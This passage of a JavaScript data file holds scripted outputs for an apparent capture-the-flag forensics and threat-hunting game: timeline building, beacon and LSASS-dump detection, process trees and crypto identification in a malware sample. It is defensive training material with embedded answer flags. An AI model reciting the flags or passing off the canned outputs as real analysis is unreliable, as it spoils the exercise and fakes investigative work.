    run: { cmd:'log2timeline.py /output/dump.plaso /mnt/evidence/ 2>&1 | tail -6', out:
`Parsing: /mnt/evidence/disk/C_drive.E01 ................ done
Parsing: /mnt/evidence/logs/Security.evtx .............. done
Parsing: /mnt/evidence/logs/System.evtx ................ done
Parsing: /mnt/evidence/network/capture.pcap ............ done

Completed. Events written: 2,847,391
Storage: /output/dump.plaso

[✓] Super-timeline built: 2.84M events across 4 evidence sources` },
    filter: { cmd:"psort.py -o l2tcsv /output/dump.plaso \"date > '2024-03-15 03:10:00' AND date < '2024-03-15 03:20:00'\" > window.csv && wc -l window.csv", out:
`Filtering 2.84M events to 03:10–03:20 UTC window...

1848 window.csv

[✓] 1,847 events isolated from 2.84M
[i] 10-minute attacker window is now reviewable
[✓] Exported to window.csv` },
    first_action: { cmd:"head -8 window.csv | column -s',' -t 2>/dev/null", out:
`datetime              source  description
2024-03-15T03:10:01Z  EVTX    4624 Logon jsmith WS-ENGR-04 Type3
2024-03-15T03:10:05Z  HTTP    GET /Q1_Review.xlsm 200
2024-03-15T03:11:02Z  EVTX    4688 powershell.exe parent=WINWORD
2024-03-15T03:11:22Z  DISK    Created: C:\\Users\\Public\\svchost.dll
2024-03-15T03:11:45Z  EVTX    4688 rundll32.exe parent=powershell
2024-03-15T03:12:03Z  EVTX    4688 svchost.exe PPID anomaly

[✓] First attacker action: 03:11:02 — PowerShell spawned by Word
[✓] Dropper written: 03:11:22  C2 established: 03:12:03` },
    correlate: { cmd:"grep -E 'sshd|apache|kernel' window.csv | head -5", out:
`2024-03-15T03:10:01Z  SYSLOG  sshd: Accepted publickey jsmith from 10.0.1.42
2024-03-15T03:10:05Z  APACHE  10.0.1.42 GET /uploads/Q1_Review.xlsm 200
2024-03-15T03:11:45Z  KERNEL  audit execve powershell.exe uid=1001

[✓] SSH → file download → exec chain confirmed across 3 sources
[✓] sshd + apache + kernel events correlated in 45-second window` },
    csv: { cmd:"cut -d',' -f1,2,4 window.csv | head -10 > report_timeline.csv && echo Done", out:
`Done

report_timeline.csv preview:
  2024-03-15T03:10:01  EVTX    Logon jsmith
  2024-03-15T03:10:05  HTTP    File download Q1_Review.xlsm
  2024-03-15T03:11:02  EVTX    PowerShell spawned by WINWORD
  2024-03-15T03:11:22  DISK    svchost.dll dropped
  2024-03-15T03:12:03  EVTX    C2 beacon established

[✓] Timeline exported to CSV — ready for IR report
[✓] FLAG CAPTURED: BV{t1m3l1n3_c0rr3l4t3d_45s}` },
  },

  threat_hunt: {
    beaconing: { cmd:'python3 beacon_hunt.py --pcap corp_traffic.pcap --threshold 0.95', out:
`Beacon Hunter v2.1
Processing 48,291 connections...

[ALERT] Periodic beaconing detected:
  Source: 10.0.1.42  →  Dest: 185.220.101.47:443
    Sessions:          42
    Mean interval:     60.09s
    Std deviation:     0.19s
    Periodicity score: 0.997  [THRESHOLD: 0.95]
    First seen:        2024-03-15 03:12:03

[!] Cobalt Strike default sleep: 60s  →  MATCH
[✓] Beaconing process: PID 2448 (svchost.exe — injected)` },
    lsass_access: { cmd:"vol3 -f DESKTOP-01.vmem windows.handles --pid 3200 2>/dev/null | grep lsass", out:
`Handle  Type     PID   Process       Object
0x1f0   Process  3200  rundll32.exe  lsass.exe (PID 748)
        GrantedAccess: 0x1fffff (PROCESS_ALL_ACCESS)

[!] rundll32.exe has PROCESS_ALL_ACCESS to lsass.exe
[!] 0x1fffff = sufficient for MiniDumpWriteDump
[!] Sysmon Event 10: TargetImage=lsass.exe SourceImage=rundll32.exe
[✓] LSASS dump attempt from rundll32.exe confirmed` },
    lotl: { cmd:'vol3 -f DESKTOP-01.vmem windows.cmdline 2>/dev/null | grep -iE "net |whoami|nltest|ping|ipconfig"', out:
`3200  cmd.exe       cmd.exe /c whoami /all
3204  net.exe       net user /domain
3208  nltest.exe    nltest /domain_trusts
3212  net.exe       net group "Domain Admins" /domain
3216  ping.exe      ping -n 1 dc01.corp.internal
3220  ipconfig.exe  ipconfig /all

[!] 6 LotL discovery commands in 90-second window
[!] All built-in LOLBins: whoami, net, nltest, ping, ipconfig
[✓] Automated post-exploitation framework confirmed` },
    process_tree: { cmd:'vol3 -f DESKTOP-01.vmem windows.pstree 2>/dev/null | grep -A8 "WINWORD"', out:
`* 3120  3040  WINWORD.EXE     2024-03-15 03:10:44
** 3124  3120  powershell.exe  2024-03-15 03:11:02   ← SUSPICIOUS
*** 3128  3124  cmd.exe         2024-03-15 03:11:15
*** 3132  3124  rundll32.exe   2024-03-15 03:11:20   ← LSASS dump
*** 3136  3124  net.exe        2024-03-15 03:11:45   (discovery)
*** 3140  3124  nltest.exe     2024-03-15 03:11:51   (discovery)
** 2448  1832  svchost.exe     2024-03-15 03:12:03   ← C2 beacon (injected)

[✓] Full tree: WINWORD→PS→cmd/rundll32/net
[✓] Injection into svchost for persistent C2 at 03:12:03
[✓] FLAG CAPTURED: BV{pr0c3ss_tr33_lsass_dump}` },
  },

  crypt_re: {
    entropy: { cmd:'python3 entropy_scan.py sample_with_crypto.exe --block 256', out:
`Block entropy scan (256-byte windows):

0x0000  5.81  Normal code
0x1000  6.12  Normal code
0x2000  7.94  !! HIGH ENTROPY
0x2100  7.91  !! HIGH ENTROPY
0x3000  6.08  Normal code
0x5000  7.88  !! HIGH ENTROPY
0x5100  7.83  !! HIGH ENTROPY

[!] 2 high-entropy regions: 0x2000–0x2FFF and 0x5000–0x5FFF
[i] Region 1: likely AES-encrypted payload
[i] Region 2: likely key material
[✓] High-entropy map guides disassembly targets` },
    sbox: { cmd:'python3 find_crypto.py sample_with_crypto.exe --aes', out:
`Scanning for AES S-box constants...

Found at offset 0x00004420:
  63 7c 77 7b ef c5 30 01 67 2b fe d7 ab 76 ca 82
  c9 7d fa 59 47 f0 ad d4 a2 af 9c a4 72 c0 b7 fd  ...

[✓] AES Forward S-box confirmed  (63 7c 77 7b matches FIPS-197)
[✓] AES Inverse S-box at 0x00004520  (52 09 6a d5...)
[i] Function at 0x00401820 contains the S-box reference
[i] Both S-boxes present = full AES encrypt + decrypt` },
    keysched: { cmd:'python3 keysched_detect.py sample_with_crypto.exe --offset 0x4320', out:
`Key schedule region at 0x00004320:
  176 consecutive bytes of expanded key material
  Structure: 11 × 16-byte round keys
  Round 0  (original key): 2b 7e 15 16 28 ae d2 a6...
  Round 1  (first expand): a0 fa fe 17 88 54 2c b1...
  ...
  Round 10 (final round):  13 11 1d 7f e3 94 4a 17...

[✓] AES-128 key schedule: 11 × 16 = 176 bytes (FIPS-197)
[i] Original 16-byte key at schedule offset 0` },
    rc4: { cmd:'python3 find_crypto.py sample_with_crypto.exe --rc4', out:
`Scanning for RC4 KSA pattern...

Found at offset 0x00401200:
  ; S-box init: S[i] = i  (for i in 0..255)
  ; KSA outer: for i in 0..255:
  ;   j = (j + S[i] + key[i % keylen]) & 0xFF
  ;   swap(S[i], S[j])

[✓] RC4 KSA: 256-byte init + double-loop + swap pattern
[✓] S-box size 256 bytes (definitive RC4 signature)
[✓] Two ciphers confirmed: AES-128 (payload) + RC4 (stream)
[i] AES decrypts payload; RC4 encrypts C2 traffic
[✓] FLAG CAPTURED: BV{a3s_rc4_dual_c1ph3r}` },
  },
};
